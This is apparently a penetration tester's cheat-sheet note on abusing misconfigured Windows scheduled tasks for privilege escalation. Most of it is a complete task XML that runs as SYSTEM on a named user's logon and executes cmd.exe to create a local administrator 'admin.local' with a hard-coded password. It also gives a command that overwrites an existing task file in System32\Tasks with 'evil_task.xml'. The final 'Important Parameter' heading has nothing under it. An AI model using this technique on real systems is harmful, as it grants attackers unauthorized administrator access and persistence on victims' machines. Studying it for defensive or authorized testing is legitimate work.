---
type: tool
category: windows-builtin
tags:
  - tool
---
# Overview
If configured incorrectly it is possible to add a task as unprivileged user, which executes as `NT/Authority`. This opens us the door to e.g. create a new `local Admin` user or to get creative.


## Possibilities

### Create local Admin over new Task
1. Create the `XML-file` containing the "task-commands". Here we specify to execute the task as `System (S-1-5-18)` and create the user `admin.local` with the password `Password!`. This task trigger every time the user "NEXURA\hwilliam" logs in:
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>NEXURA\hwilliam</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>NEXURA\hwilliam</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopContent>TimeLimit</StopContent>
      <ResetOnIdle>false</ResetOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c net user admin.local Password! /add &amp;&amp; net localgroup administrators admin.local /add</Arguments>
    </Exec>
  </Actions>
</Task>
```
2. Overwrite an existing task (its recommended to overwrite a user task instead of system task...)
```powershell
copy /y evil_task.xml "C:\Windows\System32\Tasks\User_Feed_Synchronization-{7E82AF70-9758-401A-8D86-71FCCC5DBEAC}"
```
## Important Parameter
